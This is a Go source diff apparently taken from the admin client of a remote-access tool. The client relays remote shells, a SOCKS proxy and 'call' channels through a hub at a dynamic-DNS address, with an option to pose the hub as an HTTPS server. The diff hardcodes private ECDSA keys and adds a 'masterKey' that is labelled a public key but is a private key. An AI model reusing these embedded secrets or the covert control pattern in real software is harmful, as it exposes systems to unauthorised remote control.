@@ -22,15 +22,17 @@ import (
 	vlog "local/log"
 )
 
-
-var hubPubKey, _ = base64.StdEncoding.DecodeString("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArogYEOHItjtm0wJOX+hSHjGTIPUsRo/TyLGYxWVk79pNWAhCSvH9nfvpx0skefcL/Nd++Qb/zb3c+o7ZI4zbMKZJLim3yaN8IDlgrjKG7wmjB5r49++LrvRzjIJCAoeFog2PfEn3qlQ+PA26TqLsbPNZi9nsaHlwTOqGljg82g23Zqj1o5JfitJvVlRLmhPqc8kO+4Dvf08MdVS6vBGZjzWFmGx9k3rrDoi7tem22MflFnOQhgLJ4/sbd4Y71ok98ChrQhb6SzZKVWN5v7VCuKqhFLmhZuK0z0f/xkBNcMeCplVLhs/gLIU3HBmvbBSYhmN4dDL19cAv1MkQ6lb1dwIDAQAB")
-var public_ECDSA, _ = base64.StdEncoding.DecodeString("MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEc8tgqZX82zrd6809YWzJkh4zhvaoCEbkU8yxBW+a9U1L+XgItJGRL33vYecv4lH9ovSNgJiyvnqdmqkJtwq52Q==")
-var private_ECDSA, _ = base64.StdEncoding.DecodeString("MHcCAQEEIFABqR2iqeprQ5Mu3236NGFryXU+J8pUlC14ijvhuSBgoAoGCCqGSM49AwEHoUQDQgAEc8tgqZX82zrd6809YWzJkh4zhvaoCEbkU8yxBW+a9U1L+XgItJGRL33vYecv4lH9ovSNgJiyvnqdmqkJtwq52Q==")
-
-var verb = flag.Int("v", 6, "Verbosity")
-var huburl = flag.String("t", "cs8425.noip.me:8787", "hub url")
-
 var (
+	hubPubKey, _ = base64.StdEncoding.DecodeString("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArogYEOHItjtm0wJOX+hSHjGTIPUsRo/TyLGYxWVk79pNWAhCSvH9nfvpx0skefcL/Nd++Qb/zb3c+o7ZI4zbMKZJLim3yaN8IDlgrjKG7wmjB5r49++LrvRzjIJCAoeFog2PfEn3qlQ+PA26TqLsbPNZi9nsaHlwTOqGljg82g23Zqj1o5JfitJvVlRLmhPqc8kO+4Dvf08MdVS6vBGZjzWFmGx9k3rrDoi7tem22MflFnOQhgLJ4/sbd4Y71ok98ChrQhb6SzZKVWN5v7VCuKqhFLmhZuK0z0f/xkBNcMeCplVLhs/gLIU3HBmvbBSYhmN4dDL19cAv1MkQ6lb1dwIDAQAB")
+	public_ECDSA, _ = base64.StdEncoding.DecodeString("MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEc8tgqZX82zrd6809YWzJkh4zhvaoCEbkU8yxBW+a9U1L+XgItJGRL33vYecv4lH9ovSNgJiyvnqdmqkJtwq52Q==")
+	private_ECDSA, _ = base64.StdEncoding.DecodeString("MHcCAQEEIFABqR2iqeprQ5Mu3236NGFryXU+J8pUlC14ijvhuSBgoAoGCCqGSM49AwEHoUQDQgAEc8tgqZX82zrd6809YWzJkh4zhvaoCEbkU8yxBW+a9U1L+XgItJGRL33vYecv4lH9ovSNgJiyvnqdmqkJtwq52Q==")
+
+	// ECDSA public key for access bot
+	masterKey, _ = base64.StdEncoding.DecodeString("MHcCAQEEIExJp+W5/4LtO4TPl+dtfStzS2o5x+HEknHMfSLNcI4loAoGCCqGSM49AwEHoUQDQgAEm9tjBE8e0jYIcXUkB19q88RVNkuzqle2vJIB9wc4grM4txyn6WpBOFG17QqajSemJarrQ+FFmPEAlVIXEMDt4g==")
+
+	verb = flag.Int("v", 6, "Verbosity")
+	huburl = flag.String("t", "cs8425.noip.me:8787", "hub url")
+
 	fakeHttp = flag.Bool("http", true, "hub act as http server")
 	httpTLS = flag.Bool("tls", true, "via https")
 
@@ -68,6 +70,7 @@ func main() {
 	admin.HubPubKey = hubPubKey
 	admin.Private_ECDSA = private_ECDSA
 	admin.Public_ECDSA = public_ECDSA // not used
+	admin.MasterKey = masterKey
 
 	var conn net.Conn
 	var err error
@@ -541,6 +544,7 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 		//vlog.Vln(2, "socksv5")
 		p1, err := admin.GetConn2Client(id, base.B_fast0)
 		if err != nil {
+			vlog.Vln(2, "[socks]init err", err)
 			return
 		}
 		defer p1.Close()
@@ -552,6 +556,7 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 	case "shk":
 		p1, err := admin.GetConn2Client(id, base.B_shk)
 		if err != nil {
+			vlog.Vln(2, "[shk]init err", err)
 			return
 		}
 		defer p1.Close()
@@ -563,6 +568,7 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 	case "sh":
 		p1, err := admin.GetConn2Client(id, base.B_csh)
 		if err != nil {
+			vlog.Vln(2, "[sh]init err", err)
 			return
 		}
 		defer p1.Close()
@@ -591,6 +597,7 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 	case "call":
 		p1, err := admin.GetConn2Client(id, base.B_call)
 		if err != nil {
+			vlog.Vln(2, "[call]init err", err)
 			return
 		}
 		defer p1.Close()
